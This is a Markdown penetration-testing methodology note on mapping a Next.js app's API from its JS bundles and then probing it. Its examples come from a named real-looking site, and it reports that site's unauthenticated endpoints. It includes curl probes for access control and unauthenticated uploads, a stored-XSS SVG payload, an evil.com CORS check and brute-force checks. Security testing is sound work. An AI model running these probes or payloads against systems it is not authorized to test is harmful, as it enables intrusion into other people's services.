# Next.js / React SPA — API surface extraction (recon technique)

When a Next.js SPA target gives nothing on `/api/*` probes (all 404), the real
endpoint map is inside the JS bundles. Recovered the full API surface of a
Next.js PWA (pondokdigital.co.id, 2026-08-30) in ~4 steps, no auth needed:

## 1. Collect the JS chunk paths from rendered pages
Grep the HTML of login/register/root pages for the script tags. NOTE: when
grep-ing two files at once, the output is prefixed `file:` — strip it before
looping, or curl will fail DNS on `https://hostfile:/...`.
```bash
curl -sk https://TARGET/login -o login.html
curl -sk https://TARGET/register -o register.html
grep -oE '/_next/static/chunks/[a-zA-Z0-9~._-]+\.js' login.html register.html | sort -u > chunks.txt
sed 's/^[^:]*://' chunks.txt | sort -u > jspaths.txt     # strip "login.html:" prefix
```

## 2. Download all chunks
Sanitize filenames (`~` is legal in the URL but painful on disk) and skip empties:
```bash
while read j; do n=$(basename "$j" | tr '~' '_' | tr -cd 'A-Za-z0-9._-'); \
  [ -n "$n" ] && curl -sk "https://TARGET$j" -o "$n"; done < jspaths.txt
```

## 3. Find the axios/fetch API wrapper (the baseURL is the key)
The single most valuable grep — one line of output reveals the whole API base:
```bash
grep -l '/api/v1' *.js          # which chunk builds the API client
grep -oP '.{200}/api/v1.{400}' <chunk> | head -c 3000
```
Expected: `axios.create({baseURL: `${window.location.origin}/api/v1`, withCredentials:true})`.
`withCredentials:true` = cookie-based auth → CSRF surface; `baseURL` built from
origin = path join is dynamic, so raw string search for full endpoints fails —
go to step 4 instead.

## 4. Extract the endpoint paths from call sites
The chunk's literal API paths are the string args to `.get/.post/.put/...`:
```bash
cat *.js | grep -oP '\.(get|post|put|delete|patch)\([^)]{1,90}' | grep -iE '"/|`' | sort -u
```
Also worth grepping any string starting with a lowercase path segment:
```bash
cat *.js | grep -oP '"/[a-z][a-zA-Z0-9_/-]{2,50}"' | sort -u   # frontend routes too
```
On pondokdigital this surfaced `/auth/login`, `/auth/refresh`, `/pondok/register`,
`/paket`, `/sipp/pengaturan/info`, plus SPA routes `/dashboard`, `/dashboard/wali`,
**`/superadmin`** (a route worth probing for broken access control).

## 5. Probe the endpoints
```bash
B=https://TARGET
curl -sk "$B/api/v1/paket" -w "\nHTTP %{http_code}\n"        # 200 without auth = IDOR/access-control lead
curl -sk "$B/api/v1/sipp/pengaturan/info" -w "\nHTTP %{http_code}\n"  # 401 = token required (baseline)
curl -sk "$B/superadmin" -w "HTTP %{http_code}\n" -o /dev/null        # SPA route: 307/redirect vs 200
```
First finding pattern on this target: public `/api/v1/paket` returned full
plan/pricing data unauthenticated, while `/sipp/pengaturan/info` correctly 401'd —
classic "one public endpoint, auth on others" signal to fuzz more resource names.

## Gotchas
- Minified chunks dump huge CSS-value strings first — filter `/api/`, `/v1/`, and
  `.get("/...")` patterns; don't eyeball the raw bundle.
- Chunks are only downloaded for pages you crawled — hit `/login` + `/register`
  (and any auth/onboarding page) to cover the auth + account-creation surface.
- A 307/redirect on a SPA route usually means the page exists and the guard is
  client-side (good lead for client-side-only access control); a plain 404/200
  shell tells you it's server-rendered or missing.
- API under `${origin}/api/v1` with `withCredentials` = same-origin cookie auth —
  worth testing for missing CSRF tokens + session-fixation on the auth endpoints
  once you have a valid session.

## 6. Server-side vs client-side route protection — RSC payload trick

A Next.js SPA returns the SAME HTML shell for EVERY route (200, identical `<div>`),
so `curl /superadmin` vs `/login` looks identical — you CANNOT judge access control from HTML.
The shell's client router decides what to render, but **route protection happens server-side in
the RSC (React Server Component) payload**. Probe it:

```bash
curl -sk "$B/superadmin" \
  -H "RSC: 1" \
  -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22superadmin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
```

- Response `/login` + `HTTP 307` = **server-side protected** (redirect to login) — GOOD.
- Response contains page component data without auth = **client-side-only guard / broken access control** — finding.

The `Next-Router-State-Tree` value is the URL-encoded route path array; swap `superadmin`
for any path (`dashboard`, `dashboard/wali`, …). Test every sensitive route this way.

## 7. Upload endpoint test ladder (the 405→CRITICAL path)

`/api/v1/upload` returns 405 GET but `allow: POST` — test with a real file:

```bash
# valid PNG without auth:
curl -sk -X POST "$B/api/v1/upload" -F "file=@/tmp/1x1.png;filename=test.png;type=image/png"
# success WITHOUT auth = CRITICAL finding
```

- `{"message":"Format file tidak didukung..."}` = handler validated format BEFORE auth check.
- `{"url":"https://.../uploads/xxx.png"}` = unauth upload confirmed.
- **Stored XSS via SVG:** upload `<svg onload="fetch(...)">` with `filename=evil.svg` — if it
  returns 200 and the file is served `content-type: image/svg+xml`, you have stored XSS.
- Check rate-limit headers: `x-ratelimit-limit: 1000` = total-request limit, NOT per-endpoint.
  Test login brute-force separately: 5 rapid wrong-password attempts, if all 401 with no
  throttle/lockout = finding.

## 8. Quick checks that paid off on the real target

- **CORS:** `curl -sk -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" <url> -D -`
  → look for `access-control-allow-origin: https://evil.com` echo.
- **IDOR:** any 200-no-auth endpoint returning a list is business-data exposure; probe siblings
  for per-id endpoints.
- **Security headers:** HSTS / X-Frame-Options / nosniff / CSP / Referrer-Policy missing = batch
  MEDIUM/LOW (clickjacking + MIME sniffing).
